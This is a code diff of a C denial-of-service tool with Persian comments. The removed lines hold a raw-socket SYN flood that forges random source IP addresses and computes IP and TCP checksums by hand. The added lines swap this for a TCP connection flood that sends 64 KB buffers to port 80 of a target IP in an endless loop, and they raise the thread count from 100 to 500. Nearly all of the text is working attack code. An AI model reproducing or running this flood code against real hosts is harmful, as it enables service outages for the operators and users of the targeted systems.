@@ -9,18 +9,9 @@
 #include <unistd.h>
 
 #define BUFFER_SIZE 65535
-#define THREAD_COUNT 100
+#define THREAD_COUNT 500
 
-// ساخت هدر TCP
-struct pseudo_header {
-    unsigned int source_address;
-    unsigned int dest_address;
-    unsigned char placeholder;
-    unsigned char protocol;
-    unsigned short tcp_length;
-};
-
-// محاسبه checksum
+// محاسبه Checksum
 unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
     unsigned long sum = 0;
     while (nbytes > 1) {
@@ -35,72 +26,37 @@ unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
     return (unsigned short)(~sum);
 }
 
-// ارسال بسته‌ها به IP مشخص
+// ارسال بسته‌های حجیم
 void *send_packets(void *arg) {
     char *target_ip = (char *)arg;
-    int raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
 
-    if (raw_socket < 0) {
+    if (sock < 0) {
         perror("خطا در ایجاد سوکت");
         pthread_exit(NULL);
     }
-
-    char packet[BUFFER_SIZE];
-    memset(packet, 0, BUFFER_SIZE);
-
-    struct iphdr *ip_header = (struct iphdr *)packet;
-    struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
 
     struct sockaddr_in target_addr;
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(80);
     inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
 
-    ip_header->ihl = 5;
-    ip_header->version = 4;
-    ip_header->tos = 0;
-    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
-    ip_header->frag_off = 0;
-    ip_header->ttl = 255;
-    ip_header->protocol = IPPROTO_TCP;
+    if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
+        perror("اتصال به سرور ناموفق بود");
+        close(sock);
+        pthread_exit(NULL);
+    }
 
-    tcp_header->dest = htons(80);
-    tcp_header->doff = 5;
-    tcp_header->syn = 1;
-    tcp_header->window = htons(65535);
+    char buffer[BUFFER_SIZE];
+    memset(buffer, 'A', BUFFER_SIZE);
 
     while (1) {
-        ip_header->saddr = htonl((rand() % 0xFFFFFF) + (10 << 24)); // IP تصادفی از 10.0.0.0/8
-        ip_header->id = htonl(rand() % 65535);
-        ip_header->daddr = target_addr.sin_addr.s_addr;
-
-        tcp_header->source = htons(rand() % 65535);
-        tcp_header->seq = htonl(rand());
-
-        tcp_header->check = 0;
-        ip_header->check = 0;
-
-        struct pseudo_header psh;
-        psh.source_address = ip_header->saddr;
-        psh.dest_address = target_addr.sin_addr.s_addr;
-        psh.placeholder = 0;
-        psh.protocol = IPPROTO_TCP;
-        psh.tcp_length = htons(sizeof(struct tcphdr));
-
-        char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
-        memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
-        memcpy(pseudo_packet + sizeof(struct pseudo_header), tcp_header, sizeof(struct tcphdr));
-
-        tcp_header->check = calculate_checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));
-
-        ip_header->check = calculate_checksum((unsigned short *)ip_header, sizeof(struct iphdr));
-
-        if (sendto(raw_socket, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
-            perror("خطا در ارسال بسته");
+        if (send(sock, buffer, BUFFER_SIZE, 0) < 0) {
+            perror("خطا در ارسال داده");
         }
     }
 
-    close(raw_socket);
+    close(sock);
     pthread_exit(NULL);
 }
 
